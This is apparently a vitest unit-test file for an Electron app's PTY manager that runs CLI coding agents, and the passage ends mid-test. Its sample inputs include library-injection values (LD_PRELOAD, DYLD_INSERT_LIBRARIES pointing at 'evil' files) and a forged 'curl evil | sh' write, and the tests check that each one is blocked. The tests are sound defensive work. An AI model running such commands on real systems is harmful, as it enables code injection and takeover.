import fs from "node:fs";
import { describe, expect, it, vi } from "vitest";
import type { WebContents } from "electron";
import { PTY_CHANNELS } from "../../shared/channels";

// Unit tests use a fake PTY host — pin absolute bin paths so spawn never
// depends on the machine PATH (same contract as production discovery).
vi.mock("../path-resolver", () => ({
  resolveSpawnBinary: (command: string, preferred?: string | null) => {
    const binPath =
      preferred && preferred.startsWith("/")
        ? preferred
        : `/mock/bin/${command || "cli"}`;
    return {
      binPath,
      effectivePath: "/mock/bin",
      source: preferred ? "absolute" : "process-path",
    };
  },
  revalidateExecutable: (binPath: string) =>
    typeof binPath === "string" && binPath.startsWith("/"),
  resolveCliBinary: (command: string) => ({
    binPath: `/mock/bin/${command}`,
    effectivePath: "/mock/bin",
    source: "process-path",
  }),
}));

import {
  agentEnv,
  acknowledgeSessionOutput,
  bindOwnedAgentSessionMission,
  configureAgentHookEndpointPath,
  consumeMissionOrchestratorGrant,
  getOwnedAgentSessionInfo,
  getSessionState,
  adoptMainOwnedAgentSession,
  killSession,
  killSessionsFor,
  listAgentSessions,
  recoverSessionOutput,
  setPtyHost,
  setResumeSessionLookup,
  setSessionDictationHook,
  spawnAgentSession,
  spawnMainOwnedAgentSession,
  spawnSession,
  publishSessionActivityState,
  tapSessionTermination,
  orchKillSession,
  orchTerminateSession,
  orchWriteSession,
  writeSession,
} from "./pty-manager";
import type {
  PtyHost,
  PtyProcHandle,
  PtySessionHandlers,
  PtySpawnSpec,
} from "./pty-host-core";
import type { CliPtyAdapter } from "../../shared/adapter-types";
import type { BoundSpawnAuthority } from "../orch/spawn-authority";
import {
  bindTokenToSession,
  getContext,
  mintToken,
  resetGateForTests,
} from "../orch/gate";
import { installMcpSessionTerminationRevocation } from "../orch/mcp-session-revocation";

function trustedSpawn(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  return {
    source: "direct-user",
    context: null,
    cwd,
    scope: {
      version: 1,
      installationId: "installation-test",
      projectId: "project-test",
      checkoutId: "checkout-test",
      rootRealPath: cwd,
      identitySource: "provisional",
    },
  };
}

function missionGrant(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  const base = trustedSpawn(cwd);
  return {
    ...base,
    source: "legacy-squad",
    context: {
      squadId: "review-squad",
      agentName: "Maestro",
      role: "orchestrator",
      allowedTools: ["nexus_pane_spawn"],
      allowedSkills: ["review"],
    },
  };
}

function revisionBoundWorker(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  const base = trustedSpawn(cwd);
  return {
    ...base,
    source: "pending",
    coordinationScope: base.scope,
    context: {
      missionId: "mission-worker",
      contextRevision: "context-revision-worker",
      role: "worker",
      workerIncarnationId: "worker-incarnation-main-owned",
      allowedTools: [],
      allowedSkills: null,
      scope: base.scope,
      executionScope: base.scope,
    },
  };
}

function persistedMissionGrant(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  const base = trustedSpawn(cwd);
  return {
    ...base,
    source: "persisted-pane",
    coordinationScope: base.scope,
    context: {
      missionId: "mission-persisted",
      agentName: "Persisted orchestrator",
      role: "orchestrator",
      allowedTools: null,
      allowedSkills: null,
      scope: base.scope,
      executionScope: base.scope,
    },
  };
}

// A minimal, valid cli-pty adapter shaped just enough for agentEnv(). Only the
// `env` block matters here; the rest satisfies the type.
function makeAdapter(
  env: CliPtyAdapter["env"],
  spawnPatch: Partial<CliPtyAdapter["spawn"]> = {},
): CliPtyAdapter {
  return {
    kind: "cli-pty",
    id: "test-cli",
    label: "Test CLI",
    version: "1.0.0",
    icon: "🤖",
    bin: "test-cli",
    detect: "test-cli --version",
    install: { method: "npm", command: "npm install -g test-cli" },
    auth: { method: "none" },
    spawn: {
      interactive: ["test-cli"],
      headless: ["test-cli", "--prompt", "{{PROMPT}}"],
      ptyRequired: true,
      resumeArgs: [],
      extraArgs: [],
      ...spawnPatch,
    },
    env,
    models: { flag: "--model", list: ["default"], default: "default" },
    promptInjection: {
      method: "arg",
      trailingNewline: true,
      bracketedPaste: false,
    },
    stateParsing: {
      idle: { type: "timeout", ms: 500 },
      shellIntegration: false,
      exitCodes: {},
    },
    quirks: {
      altScreen: false,
      requiresNoAutoUpdate: false,
      mcpAutoload: false,
      nexusMcp: "none",
    },
    control: {
      permission: {
        safe: ["--sandbox", "read-only"],
        yolo: [],
        modes: {},
        default: "",
      },
    },
  } as CliPtyAdapter;
}

describe("agentEnv linker-injection guard (plugin trust boundary)", () => {
  it("drops DYLD_ keys from env.static", () => {
    const env = agentEnv(
      makeAdapter({
        static: { DYLD_INSERT_LIBRARIES: "/tmp/evil.dylib", SAFE_VAR: "ok" },
        passthrough: [],
        ephemeralHome: false,
      }),
    );
    expect(env.DYLD_INSERT_LIBRARIES).toBeUndefined();
    expect(env.SAFE_VAR).toBe("ok");
  });

  it("drops LD_ keys from env.static", () => {
    const env = agentEnv(
      makeAdapter({
        static: { LD_PRELOAD: "/tmp/evil.so", LD_LIBRARY_PATH: "/tmp" },
        passthrough: [],
        ephemeralHome: false,
      }),
    );
    expect(env.LD_PRELOAD).toBeUndefined();
    expect(env.LD_LIBRARY_PATH).toBeUndefined();
  });

  it("drops DYLD_/LD_ keys from env.passthrough even if present in process.env", () => {
    process.env.DYLD_TEST_INJECT = "x";
    process.env.LD_TEST_INJECT = "y";
    try {
      const env = agentEnv(
        makeAdapter({
          static: {},
          passthrough: ["DYLD_TEST_INJECT", "LD_TEST_INJECT"],
          ephemeralHome: false,
        }),
      );
      expect(env.DYLD_TEST_INJECT).toBeUndefined();
      expect(env.LD_TEST_INJECT).toBeUndefined();
    } finally {
      delete process.env.DYLD_TEST_INJECT;
      delete process.env.LD_TEST_INJECT;
    }
  });

  it("keeps ordinary static and passthrough vars", () => {
    process.env.NEXUS_TEST_TOKEN = "secret";
    try {
      const env = agentEnv(
        makeAdapter({
          static: { FOO: "bar" },
          passthrough: ["NEXUS_TEST_TOKEN"],
          ephemeralHome: false,
        }),
      );
      expect(env.FOO).toBe("bar");
      expect(env.NEXUS_TEST_TOKEN).toBe("secret");
    } finally {
      delete process.env.NEXUS_TEST_TOKEN;
    }
  });
});

// A WebContents stub that always accepts sends (canSend passes).
function fakeWc(): WebContents {
  return {
    isDestroyed: () => false,
    isCrashed: () => false,
    send: () => {},
  } as unknown as WebContents;
}

// Records the per-session proxy so a test can see which control calls fired.
function fakeHost(): {
  host: PtyHost;
  procFor: (id: string) => PtyProcHandle;
  specFor: (id: string) => PtySpawnSpec;
} {
  const procs = new Map<string, PtyProcHandle>();
  const specs = new Map<string, PtySpawnSpec>();
  return {
    host: {
      spawn(spec) {
        const proc: PtyProcHandle = {
          write: vi.fn(),
          resize: vi.fn(),
          kill: vi.fn(),
          terminate: vi.fn(async () => ({
            ok: false,
            rootExited: false,
            descendantsExited: false,
          })),
        };
        specs.set(spec.sessionId, spec);
        procs.set(spec.sessionId, proc);
        return proc;
      },
    },
    procFor: (id) => procs.get(id)!,
    specFor: (id) => specs.get(id)!,
  };
}

describe("PTY session ownership (renderer capability boundary)", () => {
  it("spawns a mission agent without a renderer and adopts it without restarting the process", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const authority = revisionBoundWorker();
    const { sessionId } = spawnMainOwnedAgentSession(
      {
        kind: "cli-agent",
        cols: 120,
        rows: 36,
        paneId: "pane-main-owned",
        adapterId: "test-cli",
      },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      authority,
    );
    const proc = h.procFor(sessionId);
    const owner = fakeWc();
    const exactClaim = {
      paneId: "pane-main-owned",
      adapterId: "test-cli",
      missionId: "mission-worker",
      role: "worker" as const,
      workerIncarnationId: "worker-incarnation-main-owned",
      model: undefined,
      accountId: undefined,
      effort: undefined,
      cwd: authority.cwd,
      agentName: undefined,
      readOnly: false,
      nativeReadOnly: false,
      allowedTools: [] as string[],
      allowedSkills: null,
      authoritySeal: undefined,
      scope: authority.scope,
    };

    expect(
      adoptMainOwnedAgentSession(owner, exactClaim),
    ).toEqual({ sessionId, state: "spawning" });
    expect(writeSession(owner, sessionId, "continue\r")).toBe(false);
    expect(getOwnedAgentSessionInfo(owner, sessionId)).toMatchObject({
      workerIncarnationId: "worker-incarnation-main-owned",
    });
    expect(proc.write).not.toHaveBeenCalled();
    killSession(owner, sessionId);
    expect(proc.kill).not.toHaveBeenCalled();
    expect(orchWriteSession(sessionId, "main-before-detach\r")).toBe(true);
    expect(proc.write).toHaveBeenCalledWith("main-before-detach\r");

    // Closing/crashing a renderer must detach an orchestrated mission process,
    // not kill the worker that the main coordinator still owns.
    killSessionsFor(owner);
    expect(proc.kill).not.toHaveBeenCalled();
    expect(writeSession(owner, sessionId, "forged\r")).toBe(false);
    expect(orchWriteSession(sessionId, "main\r")).toBe(true);
    expect(publishSessionActivityState(sessionId, "busy")).toBe(true);

    const replacement = fakeWc();
    expect(
      adoptMainOwnedAgentSession(replacement, {
        ...exactClaim,
        readOnly: true,
      }),
    ).toBeNull();
    expect(
      adoptMainOwnedAgentSession(replacement, exactClaim),
    ).toEqual({ sessionId, state: "busy" });
    killSession(replacement, sessionId);
    expect(proc.kill).not.toHaveBeenCalled();
    expect(orchKillSession(sessionId)).toBe(true);
    expect(proc.kill).toHaveBeenCalledOnce();
  });

  it('sequences output and recovers missed push chunks through the owner-only pull lane', () => {
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(async () => ({
        ok: false,
        rootExited: false,
        descendantsExited: false,
      })),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });
    const send = vi.fn();
    const owner = {
      isDestroyed: () => false,
      isCrashed: () => false,
      send,
    } as unknown as WebContents;
    const attacker = fakeWc();
    const trusted = trustedSpawn();
    const { sessionId } = spawnSession(
      owner,
      { kind: 'shell', cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: '/bin/zsh' },
    );

    (handlers as PtySessionHandlers | null)?.onData('one');
    (handlers as PtySessionHandlers | null)?.onData('two');
    expect(send).toHaveBeenNthCalledWith(1, 'pty:data', {
      sessionId,
      data: 'one',
      sequence: 1,
    });
    expect(recoverSessionOutput(owner, sessionId, 0)).toHaveLength(2);
    acknowledgeSessionOutput(owner, sessionId, 1);
    expect(recoverSessionOutput(owner, sessionId, 1)).toEqual([
      { sessionId, data: 'two', sequence: 2 },
    ]);
    expect(recoverSessionOutput(attacker, sessionId, 0)).toEqual([]);
    orchKillSession(sessionId);
  });

  it("only the owning WebContents can write to / kill a session", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();
    const attacker = fakeWc();

    const trusted = trustedSpawn();
    const { sessionId } = spawnSession(
      owner,
      { kind: "shell", cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );
    const proc = h.procFor(sessionId);

    // A different renderer (or a session id it guessed) is refused: no bytes reach the PTY.
    writeSession(attacker, sessionId, "curl evil | sh\n");
    expect(proc.write).not.toHaveBeenCalled();

    // The owner writes normally.
    writeSession(owner, sessionId, "ls\n");
    expect(proc.write).toHaveBeenCalledWith("ls\n");

    // A foreign kill is a no-op; the session stays live.
    killSession(attacker, sessionId);
    expect(proc.kill).not.toHaveBeenCalled();
    expect(getSessionState(sessionId)).not.toBeNull();

    // The owner kills it.
    killSession(owner, sessionId);
    expect(proc.kill).toHaveBeenCalledTimes(1);
    expect(getSessionState(sessionId)).toBeNull();
  });

  it("does not authorize replacement until the PTY host proves physical exit", async () => {
    let handlers: PtySessionHandlers | null = null;
    let resolveProof!: (proof: {
      ok: true;
      rootExited: true;
      descendantsExited: true;
    }) => void;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(() => new Promise<{
        ok: true;
        rootExited: true;
        descendantsExited: true;
      }>((resolve) => {
        resolveProof = resolve;
      })),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });
    const send = vi.fn();
    const owner = {
      isDestroyed: () => false,
      isCrashed: () => false,
      send,
    } as unknown as WebContents;
    const trusted = trustedSpawn();
    const { sessionId } = spawnSession(
      owner,
      { kind: "shell", cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );
    const replacement = vi.fn();
    const termination = orchTerminateSession(sessionId, {
      termTimeoutMs: 10_000,
      killTimeoutMs: 10_000,
    });
    void termination.then((exited) => {
      if (exited) replacement();
    });

    expect(proc.terminate).toHaveBeenCalledWith({
      termTimeoutMs: 10_000,
      killTimeoutMs: 10_000,
    });
    expect(getSessionState(sessionId)).not.toBeNull();
    expect(orchWriteSession(sessionId, "late command\r")).toBe(false);
    (handlers as PtySessionHandlers | null)?.onData("late output");
    await Promise.resolve();
    expect(replacement).not.toHaveBeenCalled();
    expect(
      send.mock.calls.some(([channel]) => channel === PTY_CHANNELS.data),
    ).toBe(false);

    (handlers as PtySessionHandlers | null)?.onExit(0, 15);
    resolveProof({
      ok: true,
      rootExited: true,
      descendantsExited: true,
    });
    await expect(termination).resolves.toBe(true);
    expect(getSessionState(sessionId)).toBeNull();
    expect(replacement).toHaveBeenCalledOnce();
  });
});

describe("cli-agent spawn argv hardening", () => {
  it("denies a second exclusive-auth orchestrator even when the first is detached", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const adapter: CliPtyAdapter = {
      ...makeAdapter({
        static: {},
        passthrough: [],
        ephemeralHome: false,
      }),
      id: "claude",
      label: "Claude",
    };
    const first = spawnAgentSession(
      null,
      {
        kind: "cli-agent",
        paneId: "pane-claude-first",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      missionGrant(),
    );

    expect(() =>
      spawnAgentSession(
        null,
        {
          kind: "cli-agent",
          paneId: "pane-claude-second",
          cols: 80,
          rows: 24,
        },
        adapter,
        {},
        missionGrant(),
      ),
    ).toThrow(/exclusive auth family.*physical exit proof/i);
    expect(
      listAgentSessions().filter(
        (session) => session.adapterId === "claude",
      ),
    ).toHaveLength(1);
    orchKillSession(first.sessionId);
  });

  it("revokes a stubborn PTY bearer but keeps exclusivity until process-tree proof", async () => {
    resetGateForTests();
    const spawnedHandlers: PtySessionHandlers[] = [];
    const terminate = vi.fn(async () => ({
      ok: false,
      rootExited: false,
      descendantsExited: false,
    }));
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate,
    };
    setPtyHost({
      spawn(_spec, handlers) {
        spawnedHandlers.push(handlers);
        return proc;
      },
    });
    const adapter: CliPtyAdapter = {
      ...makeAdapter({
        static: {},
        passthrough: [],
        ephemeralHome: false,
      }),
      id: "claude",
      label: "Claude",
    };
    const authority = missionGrant();
    const first = spawnAgentSession(
      null,
      {
        kind: "cli-agent",
        paneId: "pane-stubborn-claude",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      authority,
    );
    const gate = mintToken({
      label: "stubborn claude",
      role: "orchestrator",
      missionId: "mission-stubborn",
      scope: authority.scope,
      allowedTools: null,
      allowedSkills: null,
    });
    bindTokenToSession(gate.token, first.sessionId);

    const terminationTap = vi.fn();
    const disposeObserver = tapSessionTermination(terminationTap);
    const disposeRevocation = installMcpSessionTerminationRevocation();
    try {
      const termination = orchTerminateSession(first.sessionId, {
        termTimeoutMs: 1,
        killTimeoutMs: 1,
      });

      // Logical authority is revoked synchronously, before either signal can
      // produce physical exit proof.
      expect(getContext(gate.token)).toBeNull();
      expect(terminationTap).toHaveBeenCalledOnce();
      await expect(termination).resolves.toBe(false);
      expect(proc.terminate).toHaveBeenCalledWith({
        termTimeoutMs: 1,
        killTimeoutMs: 1,
      });

      // The dead bearer does not authorize replacement: the physical process
      // remains in main's inventory until the host reports its real exit.
      expect(
        listAgentSessions().some(
          (session) => session.sessionId === first.sessionId,
        ),
      ).toBe(true);
      expect(() =>
        spawnAgentSession(
          null,
          {
            kind: "cli-agent",
            paneId: "pane-replacement-too-early",
            cols: 80,
            rows: 24,
          },
          adapter,
          {},
          missionGrant(),
        ),
      ).toThrow(/exclusive auth family.*physical exit proof/i);

      await expect(
        orchTerminateSession(first.sessionId, {
          termTimeoutMs: 1,
          killTimeoutMs: 1,
        }),
      ).resolves.toBe(false);
      expect(terminationTap).toHaveBeenCalledOnce();

      spawnedHandlers[0]?.onExit(0, 9);
      expect(
        listAgentSessions().some(
          (session) => session.sessionId === first.sessionId,
        ),
      ).toBe(true);
      expect(() =>
        spawnAgentSession(
          null,
          {
            kind: "cli-agent",
            paneId: "pane-replacement-root-only",
            cols: 80,
            rows: 24,
          },
          adapter,
          {},
          missionGrant(),
        ),
      ).toThrow(/exclusive auth family.*physical exit proof/i);

      terminate.mockResolvedValueOnce({
        ok: true,
        rootExited: true,
        descendantsExited: true,
      });
      await expect(
        orchTerminateSession(first.sessionId, {
          termTimeoutMs: 1,
          killTimeoutMs: 1,
        }),
      ).resolves.toBe(true);
      expect(
        listAgentSessions().some(
          (session) => session.sessionId === first.sessionId,
        ),
      ).toBe(false);

      const replacement = spawnAgentSession(
        null,
        {
          kind: "cli-agent",
          paneId: "pane-replacement-after-exit",
          cols: 80,
          rows: 24,
        },
        adapter,
        {},
        missionGrant(),
      );
      orchKillSession(replacement.sessionId);
    } finally {
      disposeRevocation();
      disposeObserver();
      spawnedHandlers[0]?.onExit(0, 9);
      resetGateForTests();
    }
  });

  it("refuses persisted mission resume when no exact provider session exists", () => {
    const spawn = vi.fn();
    setPtyHost({ spawn });
    setResumeSessionLookup(() => null);
    const adapter = makeAdapter(
      { static: {}, passthrough: [], ephemeralHome: false },
      {
        resumeArgs: ["--continue"],
        resumeIdArgs: ["--resume"],
      },
    );

    try {
      expect(() =>
        spawnAgentSession(
          fakeWc(),
          {
            kind: "cli-agent",
            paneId: "pane-persisted",
            accountId: "account-main",
            resume: true,
            resumeLatestOnly: false,
            cols: 80,
            rows: 24,
          },
          adapter,
          {},
          persistedMissionGrant(),
        ),
      ).toThrow(/exact main-owned provider session/i);
      expect(spawn).not.toHaveBeenCalled();
    } finally {
      setResumeSessionLookup(null);
    }
  });

  it("resumes a persisted mission only with its exact captured provider session", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    setResumeSessionLookup(
      (_scope, paneId, adapterId, accountId) =>
        paneId === "pane-persisted" &&
        adapterId === "test-cli" &&
        accountId === "account-main"
          ? "provider-session-exact"
          : null,
    );
    const adapter = makeAdapter(
      { static: {}, passthrough: [], ephemeralHome: false },
      {
        resumeArgs: ["--continue"],
        resumeIdArgs: ["--resume"],
      },
    );

    try {
      const spawned = spawnAgentSession(
        fakeWc(),
        {
          kind: "cli-agent",
          paneId: "pane-persisted",
          accountId: "account-main",
          resume: true,
          resumeLatestOnly: false,
          cols: 80,
          rows: 24,
        },
        adapter,
        {},
        persistedMissionGrant(),
      );
      expect(spawned.resumeMode).toBe("exact");
      expect(h.specFor(spawned.sessionId).args).toEqual(
        expect.arrayContaining(["--resume", "provider-session-exact"]),
      );
      expect(h.specFor(spawned.sessionId).args).not.toContain("--continue");
      orchKillSession(spawned.sessionId);
    } finally {
      setResumeSessionLookup(null);
    }
  });

  it("injects the managed hook endpoint and the main-owned PTY session key", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    configureAgentHookEndpointPath("/tmp/nexus-hooks/endpoint.env");
    const owner = fakeWc();
    try {
      const { sessionId } = spawnAgentSession(
        owner,
        { kind: "cli-agent", cols: 80, rows: 24 },
        makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
        {},
        trustedSpawn(),
      );
      expect(h.specFor(sessionId).env.NEXUS_AGENT_HOOK_ENDPOINT).toBe(
        "/tmp/nexus-hooks/endpoint.env",
      );
      expect(h.specFor(sessionId).env.NEXUS_PANE_KEY).toBe(sessionId);
      killSession(owner, sessionId);
    } finally {
      configureAgentHookEndpointPath(null);
    }
  });

  it("lets direct panes follow writable provider policy and keeps workers writable", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const base = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const codex: CliPtyAdapter = {
      ...base,
      id: "codex",
      control: {
        permission: {
          safe: ["--sandbox", "workspace-write", "--ask-for-approval", "on-request"],
          yolo: ["--dangerously-bypass-approvals-and-sandbox"],
          modes: {},
          default: "",
        },
      },
    };

    const direct = spawnAgentSession(
      fakeWc(),
      { kind: "cli-agent", cols: 80, rows: 24 },
      codex,
      {},
      trustedSpawn(),
    );
    const worker = spawnAgentSession(
      fakeWc(),
      { kind: "cli-agent", cols: 80, rows: 24 },
      codex,
      {},
      revisionBoundWorker(),
    );

    expect(h.specFor(direct.sessionId).args).toEqual(expect.arrayContaining([
      "--sandbox",
      "workspace-write",
      "--ask-for-approval",
      "on-request",
    ]));
    expect(h.specFor(worker.sessionId).args).toEqual(expect.arrayContaining([
      "--sandbox",
      "workspace-write",
    ]));
    expect(h.specFor(worker.sessionId).args).not.toContain("read-only");
  });

  it("makes read-only override the configured Codex bypass", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const base = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const codex: CliPtyAdapter = {
      ...base,
      id: "codex",
      control: {
        permission: {
          safe: ["--sandbox", "workspace-write", "--ask-for-approval", "on-request"],
          yolo: ["--dangerously-bypass-approvals-and-sandbox"],
          modes: { auto: "never" },
          default: "",
        },
      },
    };
    const worker = revisionBoundWorker();
    const reviewer: BoundSpawnAuthority = {
      ...worker,
      context: {
        ...worker.context!,
        readOnly: true,
      },
    };

    const spawned = spawnAgentSession(
      fakeWc(),
      { kind: "cli-agent", cols: 80, rows: 24 },
      codex,
      { extraArgs: ["--dangerously-bypass-approvals-and-sandbox"] },
      reviewer,
    );

    expect(h.specFor(spawned.sessionId).args).not.toContain(
      "--dangerously-bypass-approvals-and-sandbox",
    );
    expect(h.specFor(spawned.sessionId).args).toContain("on-request");
    expect(h.specFor(spawned.sessionId).args).toContain("read-only");
  });

  it("keeps an approved pre-freeze Codex orchestrator read-only without provider prompts", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const base = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const codex: CliPtyAdapter = {
      ...base,
      id: "codex",
      quirks: {
        ...base.quirks,
        nexusMcp: "codex",
      },
      control: {
        permission: {
          arg: "--ask-for-approval",
          safe: [
            "--sandbox",
            "workspace-write",
            "--ask-for-approval",
            "on-request",
          ],
          yolo: ["--dangerously-bypass-approvals-and-sandbox"],
          modes: { auto: "never" },
          default: "",
        },
      },
    };
    const baseAuthority = trustedSpawn();
    const authority: BoundSpawnAuthority = {
      ...baseAuthority,
      source: "pending",
      context: {
        missionId: "mission-orchestrator",
        role: "orchestrator",
        readOnly: false,
        nativeReadOnly: true,
        scope: baseAuthority.scope,
        executionScope: baseAuthority.scope,
      },
    };

    const spawned = spawnAgentSession(
      fakeWc(),
      { kind: "cli-agent", cols: 80, rows: 24 },
      codex,
      {},
      authority,
    );

    expect(h.specFor(spawned.sessionId).args).toEqual(
      expect.arrayContaining([
        "--sandbox",
        "read-only",
        "--ask-for-approval",
        "never",
      ]),
    );
    expect(h.specFor(spawned.sessionId).args).not.toContain("on-request");
    expect(h.specFor(spawned.sessionId).args).not.toContain(
      "--dangerously-bypass-approvals-and-sandbox",
    );
  });

  it("reports every scoped agent session even when the provider chooses its id", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const hook = vi.fn();
    setSessionDictationHook(hook);
    const owner = fakeWc();
    const authority = trustedSpawn();
    const { sessionId } = spawnAgentSession(
      owner,
      { kind: "cli-agent", cols: 80, rows: 24, paneId: "pane-a" },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      authority,
    );
    expect(hook).toHaveBeenCalledWith({
      providerSessionId: null,
      ptySessionId: sessionId,
      adapterId: "test-cli",
      cwd: authority.cwd,
      paneId: "pane-a",
    });
    setSessionDictationHook(null);
    orchKillSession(sessionId);
  });

  it("appends adapter-declared extra args after user overrides", () => {
    const h = fakeHost();
    setPtyHost(h.host);

    const adapter = makeAdapter(
      { static: {}, passthrough: [], ephemeralHome: false },
      { extraArgs: ["--disallowedTools", "Task"] },
    );

    const { sessionId } = spawnAgentSession(
      fakeWc(),
      { kind: "cli-agent", cols: 80, rows: 24 },
      adapter,
      { extraArgs: ["--user-flag"] },
      trustedSpawn(),
    );

    const spec = h.specFor(sessionId);
    expect(spec.args).toContain("--user-flag");
    expect(spec.args).toEqual(expect.arrayContaining([
      "--disallowedTools",
      "Task",
      "--sandbox",
      "read-only",
    ]));
  });

  it("lets Kimi transient-model env choose the API model without an overriding --model", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const base = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...base,
      id: "kimi",
      bin: "kimi",
      spawn: { ...base.spawn, interactive: ["kimi"] },
      models: {
        flag: "--model",
        list: ["kimi-code/kimi-for-coding"],
        default: "kimi-code/kimi-for-coding",
      },
    };

    const { sessionId } = spawnAgentSession(
      fakeWc(),
      {
        kind: "cli-agent",
        adapterId: "kimi",
        model: "kimi-code/kimi-for-coding",
        cols: 80,
        rows: 24,
      },
      adapter,
      {
        keyEnv: {
          KIMI_MODEL_API_KEY: "sk-kimi-test",
          KIMI_MODEL_NAME: "kimi-for-coding",
        },
      },
      trustedSpawn(),
    );

    const spec = h.specFor(sessionId);
    expect(spec.args).not.toContain("--model");
    expect(spec.env.KIMI_MODEL_API_KEY).toBe("sk-kimi-test");
    expect(spec.env.KIMI_MODEL_NAME).toBe("kimi-for-coding");
  });

  it("normalizes the legacy Kimi OAuth model alias before adding --model", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const base = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...base,
      id: "kimi",
      bin: "kimi",
      spawn: { ...base.spawn, interactive: ["kimi"] },
      models: {
        flag: "--model",
        list: ["kimi-code/kimi-for-coding"],
        default: "kimi-code/kimi-for-coding",
      },
    };

    const { sessionId } = spawnAgentSession(
      fakeWc(),
      {
        kind: "cli-agent",
        adapterId: "kimi",
        model: "kimi-for-coding",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      trustedSpawn(),
    );

    expect(h.specFor(sessionId).args).toEqual([
      "--model",
      "kimi-code/kimi-for-coding",
      "--sandbox",
      "read-only",
    ]);
  });

  it("passes only provider-qualified OpenCode model ids", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const base = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...base,
      id: "opencode",
      bin: "opencode",
      spawn: { ...base.spawn, interactive: ["opencode"] },
      models: {
        flag: "--model",
        list: ["opencode/big-pickle"],
        default: "opencode/big-pickle",
      },
    };

    const valid = spawnAgentSession(
      fakeWc(),
      {
        kind: "cli-agent",
        adapterId: "opencode",
        model: "opencode/big-pickle",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      trustedSpawn(),
    );
    const stale = spawnAgentSession(
      fakeWc(),
      {
        kind: "cli-agent",
        adapterId: "opencode",
        model: "claude-sonnet-5",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      trustedSpawn(),
    );

    expect(h.specFor(valid.sessionId).args).toEqual([
      "--model",
      "opencode/big-pickle",
      "--sandbox",
      "read-only",
    ]);
    expect(h.specFor(stale.sessionId).args).toEqual([
      "--sandbox",
      "read-only",
    ]);
  });

  it("requires a trusted main-side binding and never falls back to HOME", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const adapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });

    expect(() =>
      spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", cols: 80, rows: 24 },
        adapter,
        {},
        undefined as never,
      ),
    ).toThrow(/trusted spawn authority/);
  });

  it("uses the canonical bound cwd even when the renderer request carries another cwd", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const adapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const trustedCwd = fs.realpathSync(process.cwd());

    const { sessionId } = spawnAgentSession(
      fakeWc(),
      {
        kind: "cli-agent",
        cwd: "/renderer-controlled/path",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      trustedSpawn(trustedCwd),
    );

    expect(h.specFor(sessionId).cwd).toBe(trustedCwd);
  });

  it("owns agent metadata in main and consumes mission promotion exactly once", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();
    const attacker = fakeWc();
    const cwd = fs.realpathSync(process.cwd());
    const baseAdapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...baseAdapter,
      quirks: { ...baseAdapter.quirks, mcpAutoload: true },
    };

    const { sessionId } = spawnAgentSession(
      owner,
      {
        kind: "cli-agent",
        paneId: "pane-orchestrator",
        model: "default",
        accountId: "account-a",
        effort: "high",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      missionGrant(cwd),
    );

    expect(getOwnedAgentSessionInfo(attacker, sessionId)).toBeNull();
    expect(getOwnedAgentSessionInfo(owner, sessionId)).toMatchObject({
      sessionId,
      paneId: "pane-orchestrator",
      adapterId: "test-cli",
      model: "default",
      accountId: "account-a",
      effort: "high",
      cwd,
      role: "orchestrator",
      squadId: "review-squad",
      source: "legacy-squad",
    });
    expect(
      consumeMissionOrchestratorGrant(attacker, sessionId, "review-squad"),
    ).toBeNull();
    expect(
